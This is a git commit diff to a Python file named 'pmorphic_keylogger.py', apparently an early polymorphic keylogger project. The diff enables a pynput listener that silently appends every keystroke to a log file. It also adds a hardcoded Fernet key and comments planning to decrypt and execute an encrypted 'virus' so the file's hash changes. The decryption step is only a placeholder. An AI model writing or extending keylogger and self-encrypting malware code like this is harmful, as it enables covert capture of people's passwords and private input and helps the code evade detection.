2db06b4ad7ca81711e26b2240edccb0dd26398af
Wowiee3 <estherlesliebala@gmail.com>
2024-10-24 14:00:59 +0800

    progress

--- pmorphic/pmorphic_keylogger.py
+++ pmorphic/pmorphic_keylogger.py
@@ -1,27 +1,32 @@
 #!/usr/bin/env python3
 
 from pynput.keyboard import Key, Listener
+from cryptography.fernet import Fernet
 import hashlib
 
-def check_hash():
-    hash = hashlib.md5(open("keylogger.py", "rb").read()).hexdigest()
+def check_hash(): # Test to see if file hash has changed
+    hash = hashlib.md5(open("pmorphic_keylogger.py", "rb").read()).hexdigest()
     print(hash)
 
-def p_engine():
+def decrypt():
     print("placeholder")
+    # WORKFLOW:
+    # Decrypt encrypted virus
+    # Exec decrypted virus
 
+key = "PLQAMThhNwtYPhLNGw9Xmcghjd6UCi5FgK7lX7i5iI8="
+check_hash()
+
+# ENCRYPT ME
 def on_press(key):
     # record keystrokes
     f = open("keylog.txt", "a")
     f.write(str(key))
-    print(key)
 
-'''
+
 with Listener(
         on_press=on_press
 ) as listener:
     listener.join()
-'''
 
-# f.close()
-check_hash()
+f.close()
